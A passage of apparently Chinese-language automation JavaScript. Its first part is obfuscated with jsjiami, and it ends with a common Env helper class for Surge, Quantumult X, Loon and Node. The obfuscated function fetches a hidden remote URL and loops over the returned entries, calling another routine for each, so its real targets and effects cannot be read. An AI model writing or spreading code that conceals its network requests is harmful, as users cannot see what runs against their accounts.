_0x2d30a9[_0x5115('c4','Q2YS')](shuye73);}}}}catch(_0x4d767e){$[_0x5115('c5','&eEu')](_0x4d767e,_0x4063cd);}finally{_0x2d30a9[_0x5115('c6','cQts')](_0x42d03e);}});}else{data=JSON[_0x5115('c7','@dz&')](data);}});}function shuye73(){var _0x203bde={'NXvds':function(_0x558979,_0x2665a7){return _0x558979===_0x2665a7;},'lLeqb':_0x5115('c8','byi4'),'ekLDB':_0x5115('c9','9dNF'),'coiAr':function(_0x52bb21,_0x1fca37){return _0x52bb21!==_0x1fca37;},'XFlOb':_0x5115('ca','!z6T'),'DxSKM':function(_0x4fb5f8,_0x39c847){return _0x4fb5f8<_0x39c847;},'owmep':function(_0x9689c8,_0x1a0a84){return _0x9689c8(_0x1a0a84);},'EBOqT':function(_0x28754a){return _0x28754a();},'EdHPb':_0x5115('cb','@dz&'),'QGebn':_0x5115('cc','n3r8')};return new Promise(_0x2f51eb=>{var _0x2ee6e2={'RSxjW':function(_0x55d7c1,_0x24e5be){return _0x203bde[_0x5115('cd','4g(c')](_0x55d7c1,_0x24e5be);},'hxzVF':_0x203bde[_0x5115('ce','kWSI')],'InQTn':_0x203bde[_0x5115('cf','YolQ')],'bkVQj':function(_0xab8906,_0x2d3a16){return _0x203bde[_0x5115('d0','Rwm%')](_0xab8906,_0x2d3a16);},'wuOHb':_0x203bde[_0x5115('d1','!z6T')],'WJFiI':function(_0x4187b8,_0x5cdb1e){return _0x203bde[_0x5115('d2','evtc')](_0x4187b8,_0x5cdb1e);},'xrwHD':function(_0x27499c,_0x2e69ef){return _0x203bde[_0x5115('d3','V(L!')](_0x27499c,_0x2e69ef);},'ziFvf':function(_0x2d26bb){return _0x203bde[_0x5115('d4','n3r8')](_0x2d26bb);}};$[_0x5115('d5','Q2YS')]({'url':_0x203bde[_0x5115('d6','T1e2')],'headers':{'User-Agent':_0x203bde[_0x5115('d7','Hjvu')]}},async(_0x427201,_0x2effa4,_0xc8fb70)=>{if(_0x2ee6e2[_0x5115('d8','Lixa')](_0x2ee6e2[_0x5115('d9','L[MP')],_0x2ee6e2[_0x5115('da','9dNF')])){$[_0x5115('db','Uz5T')](e,_0x2effa4);}else{try{if(_0x427201){console[_0x5115('dc',')7ac')]($[_0x5115('dd','4g(c')]+_0x5115('b5','9dNF'));}else{if(_0x2ee6e2[_0x5115('de','cQts')](_0x2ee6e2[_0x5115('df','g%zL')],_0x2ee6e2[_0x5115('e0','byk#')])){if(_0x427201){console[_0x5115('e1','T1e2')]($[_0x5115('e2','5r]M')]+_0x5115('e3','dY^4'));}else{_0xc8fb70=JSON[_0x5115('e4','T]!N')](_0xc8fb70);}}else{$[_0x5115('e5','byi4')]=JSON[_0x5115('e6','cQts')](_0xc8fb70);if(_0x2ee6e2[_0x5115('e7','YolQ')]($[_0x5115('e8','5r]M')][_0x5115('e9','n3r8')],0x0)){for(let _0xa9c3a0=0x0;_0x2ee6e2[_0x5115('ea','ztnf')](_0xa9c3a0,$[_0x5115('eb','5tyk')][_0x5115('ec','CSfk')][_0x5115('ed','BqpE')]);_0xa9c3a0++){let _0x371c7f=$[_0x5115('ee','(rbN')][_0x5115('ef','YolQ')][_0xa9c3a0];await $[_0x5115('c3','EnTL')](0x1f4);await _0x2ee6e2[_0x5115('f0','byi4')](wuzhi02,_0x371c7f);}}}}}catch(_0x1c238b){$[_0x5115('f1','(rbN')](_0x1c238b,_0x2effa4);}finally{_0x2ee6e2[_0x5115('f2','byi4')](_0x2f51eb);}}});});};_0xodE='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
